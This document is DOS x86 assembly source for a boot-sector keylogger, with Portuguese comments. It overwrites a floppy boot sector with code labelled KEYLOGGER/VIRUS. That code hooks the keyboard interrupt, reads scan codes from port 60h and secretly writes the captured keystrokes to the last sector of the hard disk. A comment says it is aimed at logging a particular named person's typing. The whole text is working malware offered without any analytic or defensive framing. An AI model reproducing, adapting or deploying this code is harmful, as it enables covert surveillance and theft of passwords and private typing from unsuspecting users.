org 0x100
mov ax,201h
mov bx,SETOR
mov cx,1
mov dx,0H
int 13h

mov ah,8
mov dx,0H
mov di,0
push es
mov es,di
INT 13H
pop es

mov ax,301h
sub cl,6
mov dl,0H
MOV WORD[SETOR+510],0AA55H
mov bx,SETOR
INT 13H

LEA DI,[SETOR+3EH]
MOV SI,KEYLOGGER
MOV CX,1C0h
REP MOVSB

mov bx,SETOR
MOV WORD[SETOR+510],0AA55H
mov ax,301h
mov cx,1
mov dx,0H
INT 13H

ret


KEYLOGGER:
      cli	      
	    xor ax,ax
	    mov ds,ax
	    mov es,ax
	    mov ss,ax
	    mov sp,07C00h
	sti
		Kernel:
VIRUS:
cli
push es
mov ax,0
mov es,ax
es
mov cx,[24h]
es
mov dx,[26h]
es
mov [180h],cx
es
mov [182h],dx
;ds
;dec word [0x413]
mov bp,0
mov cx,7C70h
es
mov [24h],cx
es
mov [26h],bp
pop es
sti

push		es
mov		ax,bp
mov		es,ax
mov		ax,0
mov		bx,700h
mov		es,bp
cs
mov		[bx],ax
pop		es

mov ah,8
mov dl,0H
mov di,0
push es
mov es,di
INT 13H
pop es
sub cl,6

mov ax,0000h
mov es,ax
mov bx,500h
mov dl,0h
mov al,01h
mov ah,02h
int 13h
jmp 0000:0500h

code:
pushf
pushaw ;db 60
sti

IN		AL,60H;************ A linha mais importante do meu programa:
;LÊ OS SCAN CODES DAS TECLAS PRESSIONADAS POR ANGELS DELICIAS

push		ax
int		60h
pop		ax
push		cs
pop		bx
push		ds
mov		ds,bx
push		es
test		al,80h
jnz		L1
cs
mov		bx,[700h]
cs
lea		si,[700h+2]
cs
mov		[si+bx],al
inc		bx
mov		[cs:700h],bx
L1:
cmp		bx,512
jz		zera
jmp		pula
zera:
mov		ax,0
mov		[cs:700h],ax
pula:

mov		ah,41h
mov		bx,55AAh
mov		dl,80h
INT		13h
jc		chs

cs
mov		si,900h
mov		ah,48h
mov		dl,80h
INT		13h


mov		si,0980h
mov		al,10h
mov		[cs:0980h],al
mov		al,0
mov		[cs:0981h],al
mov		al,01
mov		[cs:0982h],al
xor		ax,ax
mov		[cs:0983h],al
lea		ax,[cs:0800h+2]
mov		[cs:0984h],ax
mov		ax,0
mov		[cs:0986h],ax
mov		ax,[cs:0910h]
sub		ax,2
mov		[cs:0988h],ax
mov		ax,[cs:0912h]
mov		[cs:098Ah],ax
xor		ax,ax
mov		[cs:098Ch],ax
mov		[cs:098Eh],ax

mov		ah,43h
mov		dl,80h
INT		13H ;A SEGUNDA LINHA MAIS IMPORTANTE DO MEU PROGRAMA: GRAVA NO ULTIMO SETOR DO DISCO RIGIDO TUDO QUE FOR TECLADO
pop		ds
jmp		skip

chs:
MOV		AH,8
MOV		DL,80h
MOV		DI,0
PUSH		ES
MOV		ES,DI
INT		13h
POP		ES

MOV		AH,3
MOV		AL,2
SUB		CL,2
PUSH		ES
MOV		BX,cs
MOV		ES,BX
MOV		BX,900h+2
MOV		DL,0h
INT		13h ;A TERCEIRA LINHA MAIS IMPORTANTE DO MEU PROGRAMA: GRAVA NO ULTIMO SETOR DO DISCO RIGIDO TUDO QUE FOR TECLADO
POP		ES

skip:
pop		ds
pop		es
mov		al,20h
out		20h,al
pop		es
pop		ds
popaw
popf
iret
codesize:

SETOR db 512 dup (0)